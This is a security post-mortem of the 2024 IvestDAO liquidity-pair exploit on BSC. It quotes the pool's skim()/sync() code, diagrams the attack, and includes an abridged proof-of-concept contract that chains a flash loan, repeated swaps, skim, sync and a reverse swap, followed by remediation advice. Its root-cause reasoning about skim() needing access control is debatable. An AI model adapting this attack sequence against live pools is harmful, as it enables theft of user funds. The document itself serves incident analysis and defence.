# IvestDAO — Flash Loan Arbitrage via skim()/sync() Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-08-15 |
| **Protocol** | IvestDAO |
| **Chain** | BSC |
| **Loss** | ~338 WBNB |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed |
| **Vulnerable Contract** | IvestDAO LP Pair |
| **Root Cause** | No access control on the `skim()` function of IvestDAO LP Pair — anyone can call it to withdraw excess pool balance and manipulate reserves |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/IvestDao_exp.sol) |

---

## 1. Vulnerability Overview

The IvestDAO LP pool is based on Uniswap V2 and implements `skim()` and `sync()` as standard. The attacker borrowed 1,200 WBNB via a Uniswap V3 flash loan, then repeatedly swapped WBNB→iVest 30 times, extracting the pool's excess balance via `skim()` calls and arbitraging by repeatedly updating reserves to a manipulated state using `sync()`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: skim() sends excess reserves to anyone
function skim(address to) external lock {
    address _token0 = token0;
    address _token1 = token1;
    // ❌ Transfers excess over reserves to the `to` address (no access control)
    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)) - reserve0);
    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)) - reserve1);
}

// sync() overwrites reserves with balanceOf
function sync() external lock {
    _update(IERC20(token0).balanceOf(address(this)),
            IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
}

// ✅ Fix: Add access control to skim()
function skim(address to) external lock onlyAuthorized {  // ✅ Restricted access
    // ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Uniswap V3 Flash Loan: borrow 1200 WBNB
  │
  ├─[2]─► WBNB → iVest swap repeated 30 times
  │         └─► iVest pool reserves change with each swap
  │
  ├─[3]─► Call skim(attacker)
  │         └─► Transfer excess iVest from pool to attacker
  │
  ├─[4]─► Call sync()
  │         └─► Update reserves with current balances (manipulated state)
  │
  ├─[5]─► Realize profit via reverse iVest → WBNB swap
  │
  ├─[6]─► Repay flash loan
  │
  └─[7]─► Total loss: ~338 WBNB
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    IPancakePair pair; // iVest/WBNB pair
    IWBNB WBNB;
    IERC20 iVest;
    Uni_Pair_V3 flashPool;

    function testExploit() external {
        // [1] Uniswap V3 flash loan for 1200 WBNB
        flashPool.flash(address(this), 0, 1200 ether, "");
    }

    function uniswapV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        // [2] WBNB → iVest repeated swap 30 times
        for (uint256 i = 0; i < 30; i++) {
            swap_token_to_token(address(WBNB), address(iVest), WBNB.balanceOf(address(this)) / 31);
        }

        // [3] Extract excess iVest via skim
        pair.skim(address(this));

        // [4] Update reserves via sync
        pair.sync();

        // [5] Reverse swap iVest → WBNB
        swap_token_to_token(address(iVest), address(WBNB), iVest.balanceOf(address(this)));

        // [6] Repay flash loan
        WBNB.transfer(address(flashPool), 1200 ether + fee1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Access Control — No access control on the `skim()` function of IvestDAO LP Pair; anyone can withdraw excess balance to an arbitrary address |
| **Attack Technique** | skim()/sync() Reserve Manipulation (flash loan serves as auxiliary funding) |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-840: Business Logic Errors |
| **Severity** | High |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **skim() Access Control**: Restrict the `skim()` function so that only an admin or governance can call it.
2. **Reserve Manipulation Detection**: Set an upper bound on the magnitude of reserve changes within a single transaction.
3. **Flash Loan Defense**: Disallow simultaneous flash loan and skim/sync calls within the same block.
4. **Uniswap V2 Fork Caution**: Uniswap V2 forks that include skim/sync functionality must always undergo access control review.

## 7. Lessons Learned

- **skim() Misuse**: Uniswap V2's `skim()` function has no access control, allowing anyone to withdraw excess balance.
- **Repeated Swap + skim Pattern**: A common attack pattern involves flash-loaning large amounts, swapping repeatedly, then using skim to extract pool excess.
- **Fork Protocol Risk**: Protocols that directly fork Uniswap V2 inherit its original design flaws as well.